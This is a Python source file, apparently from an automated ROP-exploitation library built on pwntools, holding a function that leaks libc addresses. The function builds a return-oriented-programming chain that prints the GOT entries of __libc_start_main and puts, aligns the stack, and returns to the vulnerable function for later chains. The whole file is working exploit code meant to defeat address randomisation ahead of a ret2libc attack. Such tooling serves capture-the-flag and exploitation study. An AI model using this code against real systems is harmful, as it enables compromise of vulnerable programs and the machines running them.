from autorop import PwnState, arutil, constants
from pwn import context, ROP, log, align


def puts(state: PwnState) -> PwnState:
    """Leak libc addresses using ``puts``.

    This function leaks the libc addresses of ``__libc_start_main`` and ``puts``
    using ``puts``, placing them in ``state.leaks``.

    Arguments:
        state: The current ``PwnState`` with the following set

            - ``target``: What we want to exploit.
            - ``elf``: pwntools ``ELF`` of ``state.binary_name``.
            - ``overwriter``: Function which writes rop chain to the "right place".
            - ``vuln_function``: Name of vulnerable function in binary,
              which we can return to repeatedly.

    Returns:
        Reference to the mutated ``PwnState``, with the following updated

            - ``leaks``: Updated with ``"symbol": address`` pairs for each
              function address of libc that was leaked.
    """
    assert state.overwriter is not None

    LEAK_FUNCS = ["__libc_start_main", "puts"]
    rop = ROP(state.elf)
    for func in LEAK_FUNCS:
        rop.puts(state.elf.got[func])

    # ensure that call to vuln_function is stack-aligned
    # by aligning it minus one word
    # TODO: refactor this for reusability for all rop function calls
    arutil.align_rop(
        rop,
        align(constants.STACK_ALIGNMENT, len(rop.chain())) // context.bytes - 1,
    )
    rop.call(state.vuln_function)  # return back so we can execute more chains later
    log.info(rop.dump())

    state.target.clean(constants.CLEAN_TIME)
    state.overwriter(state.target, rop.chain())

    for func in LEAK_FUNCS:
        line = state.target.readline()
        log.debug(line)
        # remove last character which must be newline
        state.leaks[func] = arutil.addressify(line[:-1])
        log.info(f"leaked {func} @ " + hex(state.leaks[func]))

    return state
